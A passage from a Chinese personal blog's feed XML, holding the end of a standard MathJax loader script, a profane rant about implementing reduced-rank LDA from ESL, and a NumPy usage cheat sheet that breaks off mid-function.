                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
            "});" +
            "MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {" +
                "var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;" +
                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
            "});" +
        "}";
    (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript);
}
&lt;/script&gt;</summary><category term="machine learning"></category><category term="机器学习"></category><category term="python"></category><category term="小结"></category><category term="numpy"></category></entry><entry><title>Fuck the Reduced-rank LDA</title><link href="http://littlezz.github.io/fuck-the-reduced-rank-lda.html" rel="alternate"></link><updated>2016-03-25T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-03-25:fuck-the-reduced-rank-lda.html</id><summary type="html">&lt;p&gt;从昨天开始一直在弄RRLDA， 直到今天晚上， 无果。&lt;br /&gt;
搜索各种资料， 各自有理， 到最后连计算 &lt;span class="math"&gt;\(W^{-\frac{1}{2}}\)&lt;/span&gt; 都能有不同的版本。  &lt;/p&gt;
&lt;p&gt;权当整理思路吧， 整理一下各种版本（可能我编程有问题， 反正所有版本我都没能算对：）  &lt;/p&gt;
&lt;h2 id="esl"&gt;&lt;a name="user-content-esl" href="#esl" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;版本一： ESL&lt;/h2&gt;
&lt;p&gt;page 114 页的算法。&lt;br /&gt;
我翻译一下：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;计算 类的重心 K x P 的矩阵M， 还有公共协方差矩阵W；&lt;/li&gt;
&lt;li&gt;计算 &lt;span class="math"&gt;\(M^* = MW^{-\frac{1}{2}}\)&lt;/span&gt;, 使用W的特征分解；&lt;/li&gt;
&lt;li&gt;计算&lt;span class="math"&gt;\(B^*\)&lt;/span&gt;, &lt;span class="math"&gt;\(M^*\)&lt;/span&gt;的协方差矩阵（B是为了between-class）, 还有他的特征分解 &lt;span class="math"&gt;\(B^* = V^*D_BV^{*T}\)&lt;/span&gt;. &lt;span class="math"&gt;\(V^*\)&lt;/span&gt;的按顺序的列&lt;span class="math"&gt;\(v_l^*\)&lt;/span&gt;定义了最佳子空间的坐标。  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;卧槽， 我他妈看懂了。&lt;br /&gt;
我往下看了一行。 &lt;br /&gt;
书上的意思是说， 你本来要算这些jb玩意的， 但是后来有一个叫做『捕鱼者（fisher）』的捕鱼达人， 给出了更吊的东西， 卧槽， 我他妈真的咸鱼啊， 这个人一波收割啊卧槽。  &lt;/p&gt;
&lt;p&gt;那我懂了， 我接着看书了。  &lt;/p&gt;
&lt;p&gt;FUCK！&lt;br /&gt;
FUCK ME！&lt;/p&gt;
&lt;p&gt;2016年03月25日00:46:12&lt;/p&gt;
&lt;script type="text/javascript"&gt;if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) {
    var align = "left",
        indent = "0em",
        linebreak = "false";

    if (true) {
        align = (screen.width &lt; 768) ? "left" : align;
        indent = (screen.width &lt; 768) ? "0em" : indent;
        linebreak = (screen.width &lt; 768) ? 'true' : linebreak;
    }

    var mathjaxscript = document.createElement('script');
    var location_protocol = (false) ? 'https' : document.location.protocol;
    if (location_protocol !== 'http' &amp;&amp; location_protocol !== 'https') location_protocol = 'https:';
    mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#';
    mathjaxscript.type = 'text/javascript';
    mathjaxscript.src = location_protocol + '//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML';
    mathjaxscript[(window.opera ? "innerHTML" : "text")] =
        "MathJax.Hub.Config({" +
        "    config: ['MMLorHTML.js']," +
        "    TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'AMS' } }," +
        "    jax: ['input/TeX','input/MathML','output/HTML-CSS']," +
        "    extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js']," +
        "    displayAlign: '"+ align +"'," +
        "    displayIndent: '"+ indent +"'," +
        "    showMathMenu: true," +
        "    messageStyle: 'normal'," +
        "    tex2jax: { " +
        "        inlineMath: [ ['\\\\(','\\\\)'] ], " +
        "        displayMath: [ ['$$','$$'] ]," +
        "        processEscapes: true," +
        "        preview: 'TeX'," +
        "    }, " +
        "    'HTML-CSS': { " +
        "        styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} }," +
        "        linebreaks: { automatic: "+ linebreak +", width: '90% container' }," +
        "    }, " +
        "}); " +
        "if ('default' !== 'default') {" +
            "MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {" +
                "var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;" +
                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
            "});" +
            "MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {" +
                "var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;" +
                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
            "});" +
        "}";
    (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript);
}
&lt;/script&gt;</summary><category term="machine learning"></category><category term="机器学习"></category><category term="他妈的"></category><category term="学学学，学个屁"></category></entry><entry><title>Numpy 使用小结</title><link href="http://littlezz.github.io/numpy-shi-yong-xiao-jie.html" rel="alternate"></link><updated>2016-03-26T11:12:24+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-03-21:numpy-shi-yong-xiao-jie.html</id><summary type="html">&lt;p&gt;&lt;a href="https://github.com/littlezz/ESL-Model"&gt;ESLModel&lt;/a&gt; 开发有一段时间了， 期间和numpy打了非常多的交道， 虐得我死去活来。  &lt;/p&gt;
&lt;p&gt;于是抽空写一下关于numpy的总结吧。  &lt;/p&gt;
&lt;h2 id="intro"&gt;&lt;a name="user-content-intro" href="#intro" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Intro&lt;/h2&gt;
&lt;p&gt;介绍一些会混淆的东西&lt;/p&gt;
&lt;h3 id="vector-vs-matrix"&gt;&lt;a name="user-content-vector-vs-matrix" href="#vector-vs-matrix" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;vector vs matrix&lt;/h3&gt;
&lt;p&gt;vector是向量， 是一维的。 &lt;br /&gt;
matrix是二维以上的。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;vec&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

&lt;span class="c1"&gt;# method 1&lt;/span&gt;
&lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;([[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]])&lt;/span&gt;

&lt;span class="c1"&gt;# method 2&lt;/span&gt;
&lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;vec&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reshape&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="c1"&gt;# mathod 3&lt;/span&gt;
&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reshape&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;vec&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# output (3,)&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# output (3, 1)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ol&gt;
&lt;li&gt;向量可以点乘矩阵， 反过来也可以， 结果是向量。&lt;/li&gt;
&lt;li&gt;向量可以点乘向量， 得到标量&lt;/li&gt;
&lt;li&gt;向量没有倒置&lt;/li&gt;
&lt;li&gt;矩阵使用下标的时候， 结果是向量， 使用slice 来查询的时候， 得到子矩阵。  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如果想要得到  单行的子矩阵  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reshape&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="c1"&gt;# 得到一行， 矩阵&lt;/span&gt;
&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;[[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;:]&lt;/span&gt;

&lt;span class="c1"&gt;# 得到一列， 矩阵&lt;/span&gt;
&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;[:,[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]]&lt;/span&gt;

&lt;span class="c1"&gt;# 得到第二列， 向量&lt;/span&gt;
&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;[:,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="c1"&gt;# 子矩阵&lt;/span&gt;
&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="c1"&gt;# 下标查询&lt;/span&gt;
&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3 id="axis1-vs-axis0"&gt;&lt;a name="user-content-axis1-vs-axis0" href="#axis1-vs-axis0" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;axis=1 vs axis=0&lt;/h3&gt;
&lt;p&gt;之前看官方的文档里面有说， 你要这样记：axis=0 是从上往下， axis=1 是从左往右处理。  &lt;/p&gt;
&lt;p&gt;比如&lt;code&gt;np.sum(mat, axis=0)&lt;/code&gt; 得到每一列从上到下的累加和. &lt;code&gt;axis=1&lt;/code&gt; 的时候得到每一行的累加和.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;m2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reshape&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;axis&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="n"&gt;Out&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;65&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;38&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4 id="rowvar1"&gt;&lt;a name="user-content-rowvar1" href="#rowvar1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;rowvar=1&lt;/h4&gt;
&lt;p&gt;在使用&lt;code&gt;np.cov&lt;/code&gt; 的时候，里面有这个参数， 默认是非零， 表示你的矩阵是（p x N）的， 每一行表示变量， 每一列里面存的是样本数据。  如果&lt;code&gt;rowvar=0&lt;/code&gt;, 则表示反过来.  &lt;/p&gt;
&lt;h2 id="tips"&gt;&lt;a name="user-content-tips" href="#tips" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Tips&lt;/h2&gt;
&lt;h3 id="reshape"&gt;&lt;a name="user-content-reshape" href="#reshape" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;reshape&lt;/h3&gt;
&lt;p&gt;reshape 里面的值设置-1的时候表示自动&lt;/p&gt;
&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reshape&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;br /&gt;
会自动变成(3x4)  &lt;/p&gt;
&lt;h3 id="_1"&gt;&lt;a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;如何插入一列&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reshape&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="c1"&gt;# 在0的开始插入全为3的列&lt;/span&gt;
&lt;span class="n"&gt;b1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;axis&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3 id="_2"&gt;&lt;a name="user-content-_2" href="#_2" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;如何把向量转成单列矩阵&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# column matrix&lt;/span&gt;
&lt;span class="n"&gt;vec&lt;/span&gt;&lt;span class="p"&gt;[:,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="c1"&gt;# row matrix&lt;/span&gt;
&lt;span class="n"&gt;vec&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;:]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3 id="a"&gt;&lt;a name="user-content-a" href="#a" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;如何算矩阵的行列式&lt;span class="math"&gt;\(|A|\)&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;用&lt;code&gt;np.linalg.det&lt;/code&gt; 或者 &lt;code&gt;np.linalg.slogdet&lt;/code&gt;&lt;br /&gt;
后者在矩阵里面的值很小的时候使用, 得到的是log后的结果.&lt;/p&gt;
&lt;h3 id="ddof"&gt;&lt;a name="user-content-ddof" href="#ddof" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;ddof&lt;/h3&gt;
&lt;p&gt;在&lt;code&gt;np.std&lt;/code&gt;等函数中有&lt;code&gt;ddof&lt;/code&gt;这个参数， 默认为0， 在pandas里面默认为1， 主要用于控制比如计算标准差的时候， 是除以N-1还是除以N， 这里相当于除以（N - ddof）&lt;/p&gt;
&lt;h3 id="svd"&gt;&lt;a name="user-content-svd" href="#svd" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;svd&lt;/h3&gt;
&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Vt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;linalg&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;svd&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Vt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# output(4, 4) (3,) (3, 3) (4, 3)&lt;/span&gt;

&lt;span class="c1"&gt;# with full_matrices=False&lt;/span&gt;
&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Vt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;linalg&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;svd&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;full_matrices&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Vt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# output (4, 3) (3,) (3, 3) (4, 3)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;br /&gt;
注意到D是向量， Vt是V的转置矩阵。&lt;br /&gt;
多数情况下， 应该是使用full_matrices=False&lt;/p&gt;
&lt;h3 id="_3"&gt;&lt;a name="user-content-_3" href="#_3" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;随机整数矩阵&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# 随机生成包含0-9的 4x3 的矩阵&lt;/span&gt;
&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3 id="orthogonal-matrix"&gt;&lt;a name="user-content-orthogonal-matrix" href="#orthogonal-matrix" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;随机生成正交矩阵（orthogonal matrix）&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;generate_orthogonal_matrix&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;N&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    with random permutation of coordinate axes&lt;/span&gt;
&lt;span class="sd"&gt;    :param N: dimension of matrix&lt;/span&gt;
&lt;span class="sd"&gt;    :return: NxN orthogonal matrix contains 0 and 1&lt;/span&gt;

&lt;span class="sd"&gt;    Ref: http://stackoverflow.com/questions/33003341/how-to-randomly-generate-a-nonnegative-orthogonal-matrix-in-numpy&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;I&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;eye&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;N&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
